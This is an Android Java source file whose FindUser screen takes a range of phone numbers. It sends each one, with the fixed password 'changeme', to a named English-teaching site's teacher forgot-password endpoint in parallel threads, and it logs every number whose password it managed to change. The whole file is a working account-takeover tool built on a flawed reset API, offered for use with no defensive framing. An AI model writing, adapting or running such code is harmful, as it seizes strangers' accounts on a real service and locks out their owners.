
package com.mycompany.myapp;

import android.app.Activity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Scanner;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.Semaphore;

public class FindUser extends Activity {

    private static final String TAG = "FindUser";
    private static final int PARALLEL_THREADS = 5;  // Number of parallel threads
    private static final int REQUESTS_PER_SECOND = 10;
    private final Semaphore rateLimiter = new Semaphore(REQUESTS_PER_SECOND);
    private ExecutorService executorService;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main3);

        final EditText startEditText = findViewById(R.id.start);
        final EditText endEditText = findViewById(R.id.end);
        final TextView logTextView = findViewById(R.id.log);
        final TextView tryTextView = findViewById(R.id.tr);
        Button searchButton = findViewById(R.id.search);

        // Initialize thread pool
        executorService = Executors.newFixedThreadPool(PARALLEL_THREADS);

        searchButton.setOnClickListener(new View.OnClickListener() {
				@Override
				public void onClick(View v) {
					String startPhoneStr = startEditText.getText().toString();
					String endPhoneStr = endEditText.getText().toString();

					if (!startPhoneStr.isEmpty() && !endPhoneStr.isEmpty()) {
						final long startPhoneNo = Long.parseLong(startPhoneStr);
						final long endPhoneNo = Long.parseLong(endPhoneStr);

						// Start rate limiter reset thread
						startRateLimiterThread();

						// Start processing phone numbers
						processPhoneNumbers(startPhoneNo, endPhoneNo, logTextView, tryTextView);
					} else {
						Toast.makeText(FindUser.this, "Please enter both start and end phone numbers", Toast.LENGTH_SHORT).show();
					}
				}
			});
    }

    private void startRateLimiterThread() {
        new Thread(new Runnable() {
				@Override
				public void run() {
					while (!Thread.currentThread().isInterrupted()) {
						try {
							Thread.sleep(20); // Reset every second
							rateLimiter.release(REQUESTS_PER_SECOND - rateLimiter.availablePermits());
						} catch (InterruptedException e) {
							Thread.currentThread().interrupt();
							break;
						}
					}
				}
			}).start();
    }

    private void processPhoneNumbers(final long startPhone, final long endPhone, 
									 final TextView logTextView, final TextView tryTextView) {
        new Thread(new Runnable() {
				@Override
				public void run() {
					final String newPassword = "changeme";

					for (long phoneNo = startPhone; phoneNo <= endPhone; phoneNo++) {
						final long currentPhoneNo = phoneNo;

						executorService.submit(new Runnable() {
								@Override
								public void run() {
									try {
										// Wait for rate limiter permit
										rateLimiter.acquire();

										// Update UI with current attempt
										runOnUiThread(new Runnable() {
												@Override
												public void run() {
													tryTextView.setText("Trying " + currentPhoneNo);
												}
											});

										System.out.println("Trying " + currentPhoneNo);

										String response = makeRequest(
											"https://www.sebaspokenenglish.com/auth/v1/teacher/forgotpassword",
											"{\"phone\":\"" + currentPhoneNo + "\",\"password\":\"" + newPassword + 
											"\",\"confirm_password\":\"" + newPassword + "\",\"forgotPass\":true}"
										);

										if (response.contains("\"data\":\"success\"")) {
											runOnUiThread(new Runnable() {
													@Override
													public void run() {
														Toast.makeText(FindUser.this, 
																	   "Password change successful for phone: " + currentPhoneNo, 
																	   Toast.LENGTH_SHORT).show();

														String currentLog = logTextView.getText().toString();
														logTextView.setText(currentLog + "\n" + 
																			"Password changed for: " + currentPhoneNo);
													}
												});
										}

									} catch (Exception e) {
										Log.e(TAG, "Error for phone number " + currentPhoneNo + 
											  ": " + e.getMessage());
									}
								}
							});
					}
				}
			}).start();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (executorService != null) {
            executorService.shutdown();
            try {
                if (!executorService.awaitTermination(800, TimeUnit.MILLISECONDS)) {
                    executorService.shutdownNow();
                }
            } catch (InterruptedException e) {
                executorService.shutdownNow();
            }
        }
    }

    private String makeRequest(String urlString, String jsonPayload) throws Exception {
        URL url = new URL(urlString);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Accept", "application/json");
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setDoOutput(true);

        try (OutputStream os = conn.getOutputStream()) {
            byte[] input = jsonPayload.getBytes("utf-8");
            os.write(input, 0, input.length);
        }

        try (Scanner scanner = new Scanner(conn.getInputStream())) {
            scanner.useDelimiter("\\A");
            return scanner.hasNext() ? scanner.next() : "";
        }
    }
	}
	
